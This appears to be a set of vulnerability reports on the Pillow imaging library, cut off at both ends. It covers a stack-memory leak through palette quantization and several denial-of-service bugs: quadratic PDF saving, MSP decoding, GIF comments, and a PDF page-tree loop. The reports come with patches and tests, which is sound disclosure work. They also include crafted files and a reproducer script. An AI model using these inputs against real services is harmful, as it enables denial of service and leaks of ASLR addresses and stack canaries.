`/proc/self/maps`, a typical run gives 43 words that are addresses inside the process's own mappings — 8 in `[stack]`, several in `[heap]`, `libc.so.6`, `libpython3.12.so` and `_imaging.cpython-312-x86_64-linux-gnu.so` — and 3 words equal to the thread's stack-protector canary (read from `fs:0x28` for comparison). The same PNG with a 3-byte `PLTE` (one entry) gives 512 zero bytes in every run. `out.save(buf, "PNG")` succeeds, so the bytes leave the process in an ordinary image. Under valgrind (run against a `strip --strip-debug` copy of `_imaging.so` or a gcc build, since valgrind 3.19 cannot read clang's DWARF5) the report carries the origin `Uninitialised value was created by a stack allocation at ImagingPaletteCacheUpdate`. With `Dither.NONE` `topalette` only copies the bytes, so the first `use of uninitialised value` is flagged where Python first branches on the pixel data; with the default Floyd-Steinberg dither it is flagged inside `topalette` (inlined into `ImagingConvert`), where the cached index is used to address `palette->palette`. ### Code path File → empty C palette. `PngImagePlugin.chunk_PLTE` (`src/PIL/PngImagePlugin.py:499-505`) stores the chunk payload whatever its length, `_open` wraps it as `ImagePalette.raw("RGB", b"")` (`:836-838`), and `Image.load()` realises it with `self.im.putpalette("RGB", "RGB", b"")` (`src/PIL/Image.py:989-990`). `_putpalette` (`src/_imaging.c:1850-1868`) rejects only more than 256 entries and sets `palette->size = palettesize * 8 / bits`, i.e. 0. `TgaImagePlugin._open` (`src/PIL/TgaImagePlugin.py:121-135`) builds the same empty palette from a colour-mapped TGA whose colour-map-length field is 0. API → sink. `Image.quantize(palette=pal)` (`src/PIL/Image.py:1329-1338`) checks only `palette.mode == "P"` and calls `self.im.convert("P", dither, palette.im)` → `ImagingConvert` → `topalette(..., inpalette=, dither)`. `topalette` tests the palette for `NULL` (`Convert.c:1162`, `:1178`) but not for `size == 0`, allocates the cache (every slot `0x100` = "not computed"), and for each source pixel: ```c // src/libImaging/Convert.c:1319-1327 (non-dither path; the dither path at 1252-1265 is the same) cache = &ImagingPaletteCache(palette, r, g, b); if (cache[0] == 0x100) { ImagingPaletteCacheUpdate(palette, r, g, b); } … out[x] = (UINT8)cache[0]; ``` Inside `ImagingPaletteCacheUpdate` the only store to `c[]` is in step 2, and both step 1 and step 2 iterate over palette entries: ```c // src/libImaging/Palette.c:160-161 unsigned int d[BOXVOLUME]; UINT8 c[BOXVOLUME]; … // src/libImaging/Palette.c:212-221, 240-242 for (i = 0; i < BOXVOLUME; i++) { d[i] = (unsigned int)~0; /* d[] is initialised, c[] is not */ } for (i = 0; i < palette->size; i++) { /* size == 0: body never runs */ if (dmin[i] <= dmax) { … if ((unsigned int)bd < d[j]) { d[j] = bd; c[j] = (UINT8)i; } ``` For any non-empty palette every slot is written: the entry that produced `dmax` passes `dmin[i] <= dmax`, and because `d[j]` starts at `~0` the first visiting entry always stores into `c[j]`. With `size == 0` the loop is skipped entirely and step 3 publishes the raw stack array: ```c // src/libImaging/Palette.c:262-266 j = 0; for (r = r0; r < r1; r += 4) { for (g = g0; g < g1; g += 4) { for (b = b0; b < b1; b += 4) { ImagingPaletteCache(palette, r, g, b) = c[j++]; ``` `cache[0]` is then ≤ 255 and `palette->palette` is a fixed 1024-byte array, so the subsequent `palette->palette[cache[0] * 4]` reads in the dither path stay in bounds; the defect is purely that stack contents become pixel values. Because no deeper call happens between successive `ImagingPaletteCacheUpdate` invocations in the pixel loop, every box yields the same 512 bytes — whatever earlier, deeper call chains (the PNG decode, the interpreter) left at that stack depth. The behaviour was introduced in `54cb09d8b48c` ("When converting to P, restrict colors to palette size", 2022-02-16), first released in 9.1.0; before it, the cache update iterated over all 256 palette slots. The `Image.new("P", ...)` route additionally depends on `fd310512b95a` ("Set C palette to be empty by default", first in 10.1.0); before that a fresh `"P"` image carried a 256-entry grey ramp. ## Impact An application that lets a user supply the reference palette image for `Image.quantize(palette=...)` — palette-swap / "apply this palette" features, sprite and GIF tooling, pixel-art converters — and returns the quantised result hands that user 512 bytes of the worker's C stack, encoded as pixel indices (directly readable from the saved PNG/GIF, since index values survive losslessly). In the build examined those bytes contain return addresses and frame pointers into the stack, heap, libc, libpython and `_imaging.so`, plus the stack-protector canary: an ASLR and canary disclosure from a long-lived server process, obtained with an 80-byte upload, no crash and no log entry. The precondition is that the attacker controls the *palette* image (the source image can be anything with at least one colour per cache box of interest); when the palette image is application-owned the path is not reachable. There is no out-of-bounds access and no memory corruption. ## Reproducing `repro` is a short, single-file Python script that runs against the installed Pillow. It doesn't rebuild anything or start any other process, and it finishes in about 0.1 s. 1. `png_with_plte()` builds a 4×4 palette-mode PNG (bit depth 8, colour type 3) around a given `PLTE` payload. With an empty payload it produces exactly the 80-byte file shown above. 2. `quantize_against()` does what an "apply this palette" feature does: it opens the PNG with `Image.open()` and calls `quantize(palette=pal, dither=Image.Dither.NONE)` on a 512×1 RGB strip. The strip holds the colours `(r*4, g*4, b*4)` for `r, g, b` in `0..7`, one for each slot of the colour-cache box `r, g, b ∈ [0,32)` and in slot order. That makes output pixel `j` exactly `c[j]` of `ImagingPaletteCacheUpdate()`. 3. **Control:** a one-entry `PLTE`. The only valid index is 0, and every output pixel is 0. 4. **Attack:** the same PNG with a zero-length `PLTE`. `quantize()` returns an image without complaint, and its pixels contain about 80 distinct values. 5. **Check:** the script reads the 512 output bytes as 64 little-endian 8-byte words and compares them with the `[stack]` range in the script's own `/proc/self/maps`. It prints each word that points into the stack. A typical run finds 8, e.g. `pixels 0..7 = 0x00007ffd959c3fa0 <- pointer into [stack]`. Pixel data can only hold stack addresses if it was copied from the stack. The script prints `BUG` if the control is all zeros and at least two output words are stack addresses. It prints `OK` if `quantize()` rejects the empty palette with `ValueError`, which is what the attached patch does, or if the output has no stack pointers. The script was also checked against an out-of-tree rebuild, which is not part of the script. With the attached patch it prints `attack (empty PLTE): rejected: empty palette` / `OK`. With only the `Palette.c` half of the patch, the output is 512 zero bytes and it prints `OK`. ## Suggested fix The attached patch rejects an empty palette in `topalette()` before any work is done, with `ValueError("empty palette")` in the same idiom as the neighbouring "no palette" / "conversion not supported" checks, so `Image.quantize()` raises a normal `ValueError`. It also zero-fills `c[]` alongside `d[]` in `ImagingPaletteCacheUpdate()` so no present or future caller can copy stack contents into the cache, and adds a regression test `test_empty_palette` to `Tests/test_image_quantize.py`. `quantize(palette=)` is the only path that hands a caller-supplied palette to `topalette()`; the `NULL`-palette branches always build 256- or 226-entry palettes and are unaffected. Apart from the regression test, the patch does not touch the Python code in `src/PIL`. Optionally `PngImagePlugin.chunk_PLTE` could additionally raise `SyntaxError` for a `PLTE` whose length is 0 or not a multiple of 3, as the PNG specification requires 1–256 entries, and `Image.quantize()` could raise a clearer Python-level error when `palette.palette` is empty. ## The patch Raise ValueError in topalette() for a palette with no entries and zero-initialise the cache slot array in ImagingPaletteCacheUpdate() Applies to `src/libImaging/Convert.c` at the commit above. ```diff diff --git a/Tests/test_image_quantize.py b/Tests/test_image_quantize.py index 887628560..dcd1d901e 100644 --- a/Tests/test_image_quantize.py +++ b/Tests/test_image_quantize.py @@ -179,3 +179,13 @@ def test_small_palette() -> None: quantized_colors = im.getcolors() assert quantized_colors is not None assert len(quantized_colors) == 2 + + +def test_empty_palette() -> None: + im = hopper() + + p = Image.new("P", (1, 1)) + p.putpalette(b"") + + with pytest.raises(ValueError): + im.quantize(palette=p) diff --git a/src/libImaging/Convert.c b/src/libImaging/Convert.c index 4a35a9a1f..7746d9255 100644 --- a/src/libImaging/Convert.c +++ b/src/libImaging/Convert.c @@ -1159,6 +1159,10 @@ topalette( alpha = mode == IMAGING_MODE_PA; + if (palette != NULL && palette->size <= 0) { + return (Imaging)ImagingError_ValueError("empty palette"); + } + if (palette == NULL) { /* FIXME: make user configurable */ if (imIn->bands == 1) { diff --git a/src/libImaging/Palette.c b/src/libImaging/Palette.c index b2dacf656..ceb69d3dc 100644 --- a/src/libImaging/Palette.c +++ b/src/libImaging/Palette.c @@ -211,6 +211,7 @@ ImagingPaletteCacheUpdate(ImagingPalette palette, int r, int g, int b) { for (i = 0; i < BOXVOLUME; i++) { d[i] = (unsigned int)~0; + c[i] = 0; } for (i = 0; i < palette->size; i++) { ``` ## The reproducer

title: Pillow: Quadratic-time DoS in PDF save_all (PdfParser.next_object_id)
desc:
``` ============================================================================ Quadratic-time DoS in PDF save_all (PdfParser.next_object_id) Location: src/PIL/PdfParser.py:629 in next_object_id() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Pillow's PDF writer takes time proportional to the square of the number of frames when it saves a multi-frame image as a multi-page PDF. Anyone who can get an application to convert their uploaded image this way can tie up a worker at full CPU for minutes with a small file. A 240 KB animated image takes about 70 seconds, a 720 KB one an estimated 10 minutes, and a 125-byte animated PNG that merely *declares* a large frame count triggers the same slowdown with no upper bound short of 2³¹ frames. Memory stays under 100 MB and the decompression-bomb limit never applies. The cause is `PdfParser.next_object_id()` in `src/PIL/PdfParser.py`, which finds the next free id by computing `max(self.xref_table.keys())`. `XrefTable.keys()` rebuilds three sets over every id reserved so far on each call. `PdfImagePlugin._save()` calls it three times (four for palette images with transparency) per frame, for `n_frames` frames, before any page is written. That makes the id-reservation loop alone O(N²). Because `n_frames` is taken from the file before any frame is seeked, APNG's `acTL` count drives the loop even when the frames don't exist. In that case the save raises `OSError` only after the full delay. The precondition is that the application calls `im.save(..., "PDF", save_all=True)` on the attacker's file; `Image.open()` and `load()` alone do not reach this code. The attached reproducer shows 4× the frames costing about 11× the CPU for a valid GIF and about 16× for a fixed 125-byte APNG. The behaviour was introduced in `6207b44ab1ff` (2018-01-18) and first shipped in Pillow 5.1.0. A small patch that tracks the highest id in `XrefTable` makes the save linear. ## Details Saving a multi-frame image as a multi-page PDF (`im.save(fp, "PDF", save_all=True)`) costs CPU time proportional to the square of the frame count, independent of pixel content, because every object id the PDF writer reserves is found by rebuilding and scanning the set of all ids reserved so far. A 1×1-pixel animated GIF made of N identical 15-byte frames (built by the reproducer) gives, on a 2-CPU container with the stock build at this commit (absolute timings vary by machine; the growth rate does not): | frames | GIF size | `im.save(BytesIO(), "PDF", save_all=True)` | peak RSS | |---|---|---|---| | 2 000 | 30 KB | 1.1 s | | | 8 000 | 120 KB | 14.7 s | | | 16 000 | 240 KB | 70 s | 60 MB | | 32 000 | 480 KB | 262 s | 95 MB | | 48 000 | 720 KB | still running at 120 s (extrapolated ≈ 10 min) | | Each doubling of the input roughly quadruples the time. `cProfile` of the 8 000-frame save attributes 13.5 s of 17.6 s to 24 003 calls of `PdfParser.next_object_id` (8.9 s inside `XrefTable.keys`, 3.9 s inside `max`); encoding and writing the 8 000 pages is the remaining ~4 s and scales linearly. The per-page id reservation loop runs before any page is written: ```python # src/PIL/PdfImagePlugin.py:247-259 (_save) for im in ims: im_number_of_pages = 1 if save_all: im_number_of_pages = getattr(im, "n_frames", 1) … for i in range(im_number_of_pages): image_refs.append(existing_pdf.next_object_id(0)) if im.mode == "P" and "transparency" in im.info: image_refs.append(existing_pdf.next_object_id(0)) page_refs.append(existing_pdf.next_object_id(0)) contents_refs.append(existing_pdf.next_object_id(0)) ``` `n_frames` comes straight from the file (for GIF it is the number of image blocks; the GIF plugin counts them by walking block headers, which is cheap). The frames do not even have to exist: the loop runs on `n_frames` before any frame is seeked, and for APNG `n_frames` is the `num_frames` value declared in the `acTL` chunk, rejected only if it is 0 or above `0x80000000` (`src/PIL/PngImagePlugin.py:716-720`). A 125-byte APNG declaring 8 000 frames therefore costs the same ~10–13 s as the 120 KB GIF, and more without bound as the declared count grows. Each of the 3 (or 4, for `P` images with transparency) calls per frame lands here: ```python # src/PIL/PdfParser.py:626-634 def next_object_id(self, offset: int | None = None) -> IndirectReference: try: # TODO: support reuse of deleted objects reference = IndirectReference(max(self.xref_table.keys()) + 1, 0) except ValueError: reference = IndirectReference(1, 0) if offset is not None: self.xref_table[reference.object_id] = (offset, 0) return reference # src/PIL/PdfParser.py:175-178 (XrefTable) def keys(self) -> set[int]: return ( set(self.existing_entries.keys()) - set(self.deleted_entries.keys()) ) | set(self.new_entries.keys()) ``` `_save` passes `offset=0`, so every reserved id is inserted into `xref_table.new_entries`. The k-th call therefore materialises three sets covering all k−1 previous ids, computes a difference and a union, and then `max()` scans the result — O(k) work to produce the integer k. Summed over 3N calls this is O(N²): for 48 000 frames, 144 002 calls over sets growing to 144 002 elements, on the order of 10¹⁰ set-element operations, all spent before `_write_image` is reached for the first frame. Nothing on this path consults `MAX_IMAGE_PIXELS` (the frames are 1×1) and nothing raises; for the GIF the save eventually completes and produces a valid PDF, and for the declared-only APNG it raises `OSError` only once the id loop has finished and the first missing frame is seeked. This reservation scheme was introduced in `6207b44ab1ff` ("issue #2959: support appending to existing PDFs", 2018-01-18) and first shipped in Pillow 5.1.0; before it, the writer numbered objects arithmetically. For contrast, `write_obj(ref, …)` with an already-reserved `ref` (`src/PIL/PdfParser.py:548-555`) only does a dict store, which is why the page-writing phase that follows is linear; the super-linear cost is entirely in how the next free id is computed. ## Impact The precondition is that the application saves the attacker's image as PDF with `save_all=True`; `Image.open()` and `load()` alone do not reach this code. An application that converts uploaded images to PDF this way — the documented way to get one page per frame from animated GIF/APNG/WebP or multi-page TIFF input — can have a worker held at 100 % CPU for about 10 minutes by a 720 KB GIF, about 4½ minutes by a 480 KB one, with the cost continuing to grow quadratically with upload size. With APNG the file size does not matter at all: a 125-byte file declaring N frames in `acTL` drives the same quadratic loop, up to the 2³¹ cap. The attacker controls only the file bytes; no unusual dimensions, modes or options are needed, memory use stays under 100 MB so memory limits do not intervene, and the decompression-bomb guard is not applicable. The consequence is denial of service of the process performing the conversion. Single-image PDF saves, and `save_all` saves of images with tens or hundreds of frames, are unaffected in practice. This is the same family as earlier accidentally-quadratic parsing issues fixed in Pillow (e.g. CVE-2021-28677, EPS `readline`), but on the PDF *writer* side, reached only through a save rather than on open, and driven by frame count rather than by line structure. ## Reproducing `repro` is a single Python script. Run it with the Python that has Pillow installed (`./repro`). It uses under 100 MB of RAM and writes no files. **Input.** Two kinds of file are built in memory, each with 2 000 and 8 000 frames: - `gif(n)`: a valid animated GIF — a `GIF89a` header with a 1×1 logical screen and a 2-colour global palette, then `n` copies of one 15-byte frame (a 1×1 image descriptor plus the LZW data for one pixel), then the trailer (30 and 120 KB). The only unusual thing about it is how many frames it has. - `apng(n)`: a 125-byte APNG — a 1×1 greyscale `IHDR`, an `acTL` chunk declaring `n` frames, one `fcTL`, one `IDAT` and `IEND`. Only the first frame exists; the other `n − 1` are merely declared. **Action.** Each file goes through what an upload-to-PDF converter would do: `Image.open(BytesIO(data))`, then `im.save(BytesIO(), "PDF", save_all=True)`, timed with `time.process_time()`. For the APNG the save raises `OSError` once the writer tries to seek to the second frame; that happens after the id-reservation loop has run for all `n` declared frames, so the exception is caught and the CPU time up to it is recorded. **Expected output** (stock build at this commit): ``` GIF frames= 2000 file= 30020 B save CPU= 1.03s result=ok GIF frames= 8000 file=120020 B save CPU= 11.68s result=ok GIF: 4x frames -> 11.3x CPU (linear ~4x, quadratic ~16x) APNG frames= 2000 file= 125 B save CPU= 0.65s result=OSError(Truncated File Read) APNG frames= 8000 file= 125 B save CPU= 10.48s result=OSError(Truncated File Read) APNG: 4x frames -> 16.1x CPU (linear ~4x, quadratic ~16x) BUG ``` A linear save would take about 4× as long for 4× the frames; here the GIF save grows ~11× and the APNG save ~16×, the latter with the file size fixed at 125 bytes. The script prints `BUG` when the save CPU for either format grows at least 8× for 4× the frames (twice the linear expectation), otherwise `OK`. Extending the same curve gives the figures in the table above: about 70 s at 16 000 frames (240 KB GIF), and about 10 minutes for a 720 KB file. With the attached patch applied, the GIF save takes 0.32 s / 1.20 s (3.7×) and the APNG save 0.01 s / 0.03 s, and the script prints `OK`. ## Suggested fix Make `next_object_id()` O(1) by tracking the highest object id ever stored in `XrefTable` instead of rebuilding the key set on every call. The attached patch does this in `src/PIL/PdfParser.py`: ```diff --- a/src/PIL/PdfParser.py +++ b/src/PIL/PdfParser.py @@ class XrefTable: self.deleted_entries = {0: 65536} # object ID => generation self.reading_finished = False + self.max_object_id = 0 # highest object ID ever stored, deleted or not def __setitem__(self, key: int, value: tuple[int, int]) -> None: if self.reading_finished: self.new_entries[key] = value else: self.existing_entries[key] = value + if key > self.max_object_id: + self.max_object_id = key if key in self.deleted_entries: del self.deleted_entries[key] @@ class PdfParser: def next_object_id(self, offset: int | None = None) -> IndirectReference: - try: - # TODO: support reuse of deleted objects - reference = IndirectReference(max(self.xref_table.keys()) + 1, 0) - except ValueError: - reference = IndirectReference(1, 0) + # TODO: support reuse of deleted objects + reference = IndirectReference(self.xref_table.max_object_id + 1, 0) if offset is not None: self.xref_table[reference.object_id] = (offset, 0) return reference ``` `existing_entries` is only ever populated through `__setitem__` (from `read_xref_table` / `read_prev_trailer`), so the counter also covers ids read from an existing file in `append=True` mode. The one behavioural difference: when the highest-numbered existing object has just been deleted (`del_root()` / `rewrite_pages()` in append mode), the current code hands that id out again with generation 0, whereas the patch moves on to the next unused id — the more conservative choice for an xref table, and the one the existing `TODO: support reuse of deleted objects` comment points at. Reproducer — repro, 1,791 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # PDF save_all is O(frames^2): PdfParser.next_object_id() does max(XrefTable.keys()), # and keys() rebuilds sets of every id reserved so far, 3 calls per frame. # (a) valid 1x1 animated GIF, 15 bytes/frame; (b) 125-byte APNG whose acTL merely # *declares* N frames - ids are reserved for all N before the first seek fails. import io, struct, time, zlib from PIL import Image def gif(n): return (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff" + b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00" * n + b"\x3b") def apng(n): def chunk(t, d): return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d)) return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0)) + chunk(b"acTL", struct.pack(">II", n, 0)) + chunk(b"fcTL", struct.pack(">IIIIIHHBB", 0, 1, 1, 0, 0, 1, 1, 0, 0)) + chunk(b"IDAT", zlib.compress(b"\x00\x00")) + chunk(b"IEND", b"")) def save_pdf(data): im = Image.open(io.BytesIO(data)) t = time.process_time() try: im.save(io.BytesIO(), "PDF", save_all=True) res = "ok" except OSError as e: # APNG: frames don't exist, fails *after* the id loop res = f"OSError({e})" return time.process_time() - t, res bug = False for name, make in (("GIF", gif), ("APNG", apng)): t = {} for n in (2000, 8000): data = make(n) t[n], res = save_pdf(data) print(f"{name:4} frames={n:5} file={len(data):6} B save CPU={t[n]:6.2f}s result={res}") growth = t[8000] / t[2000] print(f"{name}: 4x frames -> {growth:.1f}x CPU (linear ~4x, quadratic ~16x)") if growth >= 8: bug = True print("BUG" if bug else "OK") ```

title: Pillow: MSP RLE decoder expands a tiny file into unbounded memory
desc:
### Summary
The MSP RLE decoder expands run-length data into an in-memory buffer with no cap tied to the declared image size. A small file that passes the pixel-count check can force hundreds of megabytes or more of allocation when the application loads pixels.

### Details
The MSP decoder writes each run into an unbounded `io.BytesIO` and can expand roughly 85x per run:

- `src/PIL/MspImagePlugin.py:144-146`

### Impact
Memory-exhaustion denial of service from a tiny crafted image in any application that loads pixels. The expansion is decoupled from the declared pixel count, so `MAX_IMAGE_PIXELS` does not bound it.

title: Pillow: Quadratic GIF comment copying during save
desc: On Pillow 12.3.0 and upstream `main` (`ad277e2761b489681e71b51e91367d46b0ceabb9`), a GIF with a long comment makes `_get_global_header()` copy portions of the comment repeatedly when saving, including comments carried over from untrusted images. I suggest provisional **Moderate** severity for crafted-image CPU denial of service, with CVSS-B 6.9 assuming a network service automatically opens unauthenticated uploads and they are resaved as GIFs; impact depends on input-size, concurrency, and worker CPU limits.

title: Pillow: Infinite loop in PdfParser.rewrite_pages on page tree Parent cycle
desc:
``` ============================================================================ Infinite loop in PdfParser.rewrite_pages on page tree Parent cycle Location: src/PIL/PdfParser.py:505 in PdfParser.rewrite_pages() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A PDF file of a few hundred bytes makes Pillow hang forever, holding one processor core at 100%, when an application tries to append an image to it. Anyone who can supply the existing PDF to an application that calls `im.save(fp, "PDF", append=True)` (or `save_all=True, append=True`) can tie up that worker indefinitely. Memory use stays flat, so only an external timeout stops it. The bug is in `PdfParser.rewrite_pages()` in `src/PIL/PdfParser.py` (the `while pages_tree_node_ref:` loop at line 505). For each original page, it walks the `/Parent` chain upward and stops only when it reaches a node with no `/Parent`. It keeps no record of nodes it has already visited, so a loop in that chain never ends. The simplest case is a `/Pages` root that lists itself as its own `/Parent`; a longer cycle among page-tree nodes behaves the same way. The path is `PdfImagePlugin._save()` → `write_catalog()` → `rewrite_pages()`, and it is reached whether the save target is a file path or a `BytesIO`. Plain `Image.open()` pipelines are not affected, because Pillow only parses PDFs on the append path. This is a sibling of CVE-2026-42310 (the cyclic trailer `/Prev` loop in the same parser). The `processed_offsets` guard added to `read_prev_trailer()` for that issue does not cover this walk. The loop was introduced in 24ecfe315ab5 (2018-03-03) and has been present in every release since 5.1.0. The attached reproducer builds two in-memory PDFs and appends a 4×4 image to each. The normal file finishes in about 45 ms. The 333-byte self-parented file is still spinning inside `rewrite_pages()` when a 5-second watchdog interrupts it. Two alternative fixes are attached: one silently tolerates the cycle, and one rejects the file with an error. ## Details `PdfParser.rewrite_pages()` walks the `/Parent` chain of every pre-existing page upward and stops only when a node has no `/Parent`. It keeps no record of visited nodes, so a page-tree node whose `/Parent` points at itself, or at any node below it, makes the walk spin forever. The following 333-byte file is a valid one-page PDF except that object 2, the page-tree root, declares `/Parent 2 0 R`: ``` %PDF-1.4 1 0 obj <> endobj 2 0 obj <> endobj 3 0 obj <> endobj xref 0 4 0000000000 65535 f 0000000009 00000 n 0000000056 00000 n 0000000125 00000 n trailer <> startxref 192 %%EOF ``` `Image.new("RGB", (4, 4)).save(io.BytesIO(pdf), "PDF", append=True)` on these bytes never returns and holds one core at 100 % (the same happens when the target is a file path opened `r+b`). Interrupting it with `SIGALRM` after 5 s gives this traceback every time: ``` File "src/PIL/PdfImagePlugin.py", line 263, in _save existing_pdf.write_catalog() File "src/PIL/PdfParser.py", line 473, in write_catalog self.rewrite_pages() File "src/PIL/PdfParser.py", line 505, in rewrite_pages while pages_tree_node_ref: ``` The same file without `/Parent 2 0 R` on object 2 is appended to in ~30 ms. The loop: ```python # src/PIL/PdfParser.py:483-510 def rewrite_pages(self) -> None: pages_tree_nodes_to_delete = [] for i, page_ref in enumerate(self.orig_pages): page_info = self.cached_objects[page_ref] del self.xref_table[page_ref.object_id] pages_tree_nodes_to_delete.append(page_info[PdfName(b"Parent")]) … # delete redundant Pages tree nodes from xref table for pages_tree_node_ref in pages_tree_nodes_to_delete: while pages_tree_node_ref: pages_tree_node = self.cached_objects[pages_tree_node_ref] if pages_tree_node_ref.object_id in self.xref_table: del self.xref_table[pages_tree_node_ref.object_id] pages_tree_node_ref = pages_tree_node.get(b"Parent", None) self.orig_pages = [] ``` How the input gets there: with `append=True`, `PdfImagePlugin._save()` opens the existing bytes with `PdfParser.PdfParser(f=fp, …, mode="r+b")` (`src/PIL/PdfImagePlugin.py:199`), whose constructor calls `read_pdf_info()`. That reads the catalog, reads the page-tree root through `read_indirect()` — which stores every object it reads in `self.cached_objects` (`src/PIL/PdfParser.py:1077`) — and flattens the tree with `linearize_page_tree()`, which `read_indirect()`s every `/Kids` entry. So after parsing, `orig_pages == [3 0 R]` and objects 2 and 3 are both in `cached_objects`. `_save()` then calls `existing_pdf.write_catalog()` → `rewrite_pages()`. For the file above, the first loop puts page 3's `/Parent`, `2 0 R`, into `pages_tree_nodes_to_delete`. The inner `while` looks object 2 up in `cached_objects`, removes it from the xref table on the first pass, and sets `pages_tree_node_ref` to object 2's `/Parent` — which is `2 0 R` again. Nothing in the loop body changes on subsequent iterations, so it never exits: `cached_objects[2 0 R]` is never evicted, and deleting an already-deleted id from `XrefTable` is silent — `__delitem__` only records the id in `deleted_entries`, while `__contains__` keeps answering from `existing_entries`. The loop performs no I/O and no allocation, so neither `MemoryError` nor the recursion limit intervenes. A longer cycle behaves identically as long as every node on it was reached through `linearize_page_tree()` and is therefore cached (e.g. root 2 → `/Kids [4 0 R]`, node 4 → `/Kids [3 0 R] /Parent 2 0 R`, and root 2 declaring `/Parent 4 0 R`); a `/Parent` pointing at an object that was never read raises `KeyError` instead, which is harmless. The parser already defends against exactly this shape of problem one level up: `read_prev_trailer()` (`src/PIL/PdfParser.py:699-722`) carries a `processed_offsets` list and raises `PdfFormatError("trailer loop found")` when a `/Prev` offset repeats — the fix for CVE-2026-42310. The `/Parent` walk in `rewrite_pages()` has no equivalent guard. The unguarded walk was introduced in `24ecfe315ab5` ("issue #2959: fix wrong Parent of pre-existing Page objects when appending", 2018-03-03) and has been in every release since 5.1.0. ## Impact Any application that appends pages to a PDF it did not produce — `im.save(fp, "PDF", append=True)` or `save_all=True, append=True` on a user-supplied document — hangs indefinitely with one CPU core pinned, on an input of a few hundred bytes. The loop is pure Python doing two dict lookups per iteration, so memory stays flat and memory limits do not end it; only an external watchdog does. In a web worker or batch converter that is a denial of service of that worker per request. The attacker needs to control only the bytes of the existing PDF; no non-default Pillow setting is involved beyond the application choosing the append path. Pillow does not open PDFs for reading, so plain `Image.open()` pipelines are not affected. This is a sibling of CVE-2026-42310 (infinite loop on a cyclic trailer `/Prev` chain in the same parser, same entry point): same class, different linked structure, and the guard added for that CVE does not cover it. ## Reproducing `repro` is a single Python script that runs against the installed Pillow (`/src/src/PIL`). It needs no build step and no companion files, and takes about 5 seconds. The script builds two one-page PDFs in memory with `make_pdf()`. Each has a Catalog (object 1), a `/Pages` root (object 2) and a `/Page` (object 3), and each has a correct xref table. The only difference between them is in object 2: - `control` has `<>`. This is a normal file. - `cyclic` has `<>`, so the page-tree root names itself as its own `/Parent`. This is the 333-byte file shown above. For each PDF the script prints the bytes and then calls `Image.new("RGB", (4, 4)).save(io.BytesIO(pdf), "PDF", append=True)` under a 5-second `SIGALRM` watchdog. If the watchdog fires, the script prints the Pillow frames the append was running in. The control runs first and has to finish. If it doesn't, the environment is broken, so the script prints `OK` without giving a verdict. Expected output on this commit (PDF dumps omitted): ``` [control] append finished in 0.045s [cyclic] still running after 5s, interrupted in: save() /src/src/PIL/Image.py:2724 save_handler(self, fp, filename) _save() /src/src/PIL/PdfImagePlugin.py:263 existing_pdf.write_catalog() write_catalog() /src/src/PIL/PdfParser.py:473 self.rewrite_pages() rewrite_pages() /src/src/PIL/PdfParser.py:506 pages_tree_node = self.cached_objects[pages_tree_node_ref] ... BUG ``` The innermost one or two frames change from run to run, because the alarm can land anywhere in the loop body at lines 505–509. The `rewrite_pages()` frame is always there. The control's timing shows that the same file without the self-reference is appended to in milliseconds. A fixed parser either finishes the cyclic append just as fast or rejects the file with an exception. In both cases the script prints `OK`. With attached patch 1 applied it prints `[cyclic] append finished in 0.001s` and `OK`. With attached patch 2 it prints `[cyclic] raised PdfFormatError: page tree loop found` and `OK`. The last line is `BUG` only when the cyclic append is still running when the watchdog fires. ## Suggested fix Both attached patches fix the root cause, which is that the `/Parent` walk in `rewrite_pages()` keeps no record of the nodes it has visited. Either one can be merged; they differ only in what happens to a malformed file. **Attached patch 1** (tolerant; our preference) adds one `processed_pages_tree_nodes` set that is shared across all pages in the delete loop, and breaks out of the `while` as soon as it reaches a node it has already seen: ```python # src/PIL/PdfParser.py, rewrite_pages() processed_pages_tree_nodes: set[IndirectReference] = set() for pages_tree_node_ref in pages_tree_nodes_to_delete: while pages_tree_node_ref: if pages_tree_node_ref in processed_pages_tree_nodes: break processed_pages_tree_nodes.add(pages_tree_node_ref) … ``` Breaking loses nothing, because a visited node has already been removed from the xref table. The output is the same as today for every file that terminates. The file above is appended to normally, and object 2 ends up deleted. As a side effect, the ancestor chain that every page shares is walked once in total rather than once per page. **Attached patch 2** (strict) follows the `read_prev_trailer()` guard from the CVE-2026-42310 fix. It keeps a `processed_pages_tree_nodes` list for each page and calls `check_format_condition(pages_tree_node_ref not in processed_pages_tree_nodes, "page tree loop found")`, so a cyclic file is rejected with `PdfFormatError`. The list is per page because ancestors are legitimately shared between the pages of a well-formed document. Note that the error is raised from `write_catalog()`. By then the new page objects have already been written to the `r+b` file, but the new xref/trailer has not. Any other error raised on the append path today leaves the file in the same partially written state. Each patch also adds a `test_page_tree_parent_loop` regression test to `Tests/test_pdfparser.py`. The test builds the self-parented PDF above in memory, so no binary test asset is needed. No other `/Parent` walk exists in the parser, and `linearize_page_tree()` does not follow `/Parent`. Note that this walk follows `/Parent` links, which nothing else in `PdfParser` reads: `linearize_page_tree()` only follows `/Kids` downward and never looks at `/Parent`, so a visited-set added to the `/Kids` recursion (see Related findings) does not reach this loop. The file above has a perfectly tree-shaped `/Kids` structure and still hangs; both walks need their own guard, and they are natural to land together as one "validate page tree while appending" change. ## Related findings - **Exponential page tree expansion in `PdfParser.linearize_page_tree()` (repeated `/Kids` references) hangs PDF append** — the downward counterpart of this bug in the same parser and on the same `Image.save(..., "PDF", append=True)` entry point: `linearize_page_tree()` (`src/PIL/PdfParser.py:1080-1094`) recurses into every `/Kids` entry and re-parses it via `read_indirect()` with no visited set, so a `/Pages` chain whose nodes list the same child N times over D levels costs ND object parses (a 1.9 KB, 10-wide × 12-level file never returns; a 5.8 KB, 300-wide × 3-level file runs for 13 minutes; a direct `/Kids` cycle ends in `RecursionError`). It differs from this report in the link followed (`/Kids` down vs `/Parent` up), the function and phase (`linearize_page_tree()` during `read_pdf_info()` in the `PdfParser` constructor vs `rewrite_pages()` during `write_catalog()`), the introducing commit (`6207b44ab1ff` vs `24ecfe315ab5`), and the symptom (exponential but finite 